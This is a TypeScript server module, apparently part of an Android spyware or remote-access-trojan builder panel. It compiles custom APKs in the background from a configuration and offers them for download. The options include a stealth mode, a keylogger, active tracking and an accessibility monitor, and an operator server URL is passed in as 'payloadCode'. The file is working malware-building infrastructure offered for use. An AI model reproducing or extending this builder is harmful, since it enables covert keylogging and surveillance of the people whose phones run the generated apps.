import { promises as fs } from "fs";
import path from "path";
import crypto from "crypto";
import { getDb } from "./db";
import { apkBuilds } from "../drizzle/schema";
import { eq } from "drizzle-orm";
import { apkCompiler, CompilationConfig } from "./apkCompiler";

export interface APKConfig {
  appName: string;
  packageName: string;
  versionName: string;
  versionCode: number;
  stealthMode: boolean;
  sslEnabled: boolean;
  ports: number[];
  serverUrl: string;
  iconUrl?: string;
  enableKeylogger?: boolean;
  enableActiveTracking?: boolean;
  enableAccessibilityMonitor?: boolean;
}

export interface BuildResult {
  success: boolean;
  buildId: string;
  apkPath?: string;
  apkUrl?: string;
  error?: string;
  progress: number;
  status: "pending" | "building" | "signing" | "completed" | "failed";
}

export class APKBuilder {
  private buildDir: string;
  private outputDir: string;

  constructor() {
    this.buildDir = path.join(process.cwd(), "builds");
    this.outputDir = path.join(this.buildDir, "outputs");
  }

  async initialize(): Promise<void> {
    try {
      await fs.mkdir(this.buildDir, { recursive: true });
      await fs.mkdir(this.outputDir, { recursive: true });
    } catch (error) {
      console.error("[APKBuilder] Failed to initialize directories:", error);
    }
  }

  async buildAPK(config: APKConfig, userId: number): Promise<BuildResult> {
    const buildIdStr = `build-${Date.now()}-${crypto.randomBytes(2).toString("hex")}`;
    const db = await getDb();
    let buildRecordId = 0;

    try {
      await this.initialize();

      // 1. Crear registro inicial en la DB
      if (db) {
        // Usamos values().returning() o similar según soporte. 
        // Si returning() falla, insertamos y luego buscamos o usamos la respuesta del insert.
        const result = await db.insert(apkBuilds).values({
          buildId: buildIdStr,
          createdBy: userId,
          appName: config.appName,
          packageName: config.packageName,
          versionName: config.versionName,
          versionCode: config.versionCode,
          stealthMode: config.stealthMode,
          sslEnabled: config.sslEnabled,
          ports: config.ports,
          serverUrl: config.serverUrl,
          status: "building",
          createdAt: new Date(),
        });
        
        // En MySQL/TiDB, el resultado suele ser un objeto con insertId
        buildRecordId = (result as any)[0]?.insertId || Date.now();
      }

      // 2. Preparar Config para el compilador local
      const compilationConfig: CompilationConfig = {
        buildId: buildRecordId,
        appName: config.appName,
        packageName: config.packageName,
        versionCode: config.versionCode,
        versionName: config.versionName,
        stealthMode: config.stealthMode,
        enableSSL: config.sslEnabled,
        ports: config.ports,
        payloadCode: config.serverUrl,
        iconUrl: config.iconUrl,
        obfuscate: false,
        targetArchitectures: ["arm64-v8a", "armeabi-v7a"],
      };


      // 3. Kick off compilation in the background (don't await)
      // This prevents the HTTP request from timing out while apktool runs
      setImmediate(async () => {
        try {
          const buildResult = await apkCompiler.compileAPK(compilationConfig);

          if (!buildResult.success) {
            throw new Error(buildResult.error || "Falla en compilación local");
          }

          // Move the APK to the downloads directory
          const finalApkPath = path.join(this.outputDir, `${buildIdStr}.apk`);
          if (buildResult.apkPath) {
            await fs.copyFile(buildResult.apkPath, finalApkPath);
          }

          // Update DB to ready with download URL
          if (db) {
            await db.update(apkBuilds)
              .set({ status: "ready", apkUrl: `/api/apk/download/${buildIdStr}` })
              .where(eq(apkBuilds.buildId, buildIdStr));
          }
        } catch (error) {
          console.error(`[APKBuilder] Background build failed:`, error);
          if (db) {
            await db.update(apkBuilds)
              .set({ status: "failed", buildLogs: String(error).substring(0, 4000) })
              .where(eq(apkBuilds.buildId, buildIdStr));
          }
        }
      });

      // Return immediately — client should poll getBuildStatus
      return {
        success: true,
        buildId: buildIdStr,
        apkUrl: `/api/apk/download/${buildIdStr}`,
        progress: 0,
        status: "building" as const,
      };

    } catch (error) {
      console.error(`[APKBuilder] Local Build failed:`, error);
      if (db && buildRecordId) {
        await db.update(apkBuilds).set({ status: "failed" }).where(eq(apkBuilds.id, buildRecordId));
      }
      return {
        success: false,
        buildId: buildIdStr,
        error: error instanceof Error ? error.message : "Build failed",
        progress: 0,
        status: "failed",
      };
    }
  }

  async downloadAPK(buildId: string): Promise<Buffer | null> {
    try {
      const apkPath = path.join(this.outputDir, `${buildId}.apk`);
      return await fs.readFile(apkPath);
    } catch (error) {
      return null;
    }
  }

  async cleanupBuild(buildId: string): Promise<void> {
    try {
      const apkPath = path.join(this.outputDir, `${buildId}.apk`);
      await fs.unlink(apkPath).catch(() => {});
    } catch (error) {
      console.error(`[APKBuilder] Cleanup failed for ${buildId}:`, error);
    }
  }
}

let apkBuilder_instance: APKBuilder | null = null;
export function getAPKBuilder(): APKBuilder {
  if (!apkBuilder_instance) apkBuilder_instance = new APKBuilder();
  return apkBuilder_instance;
}
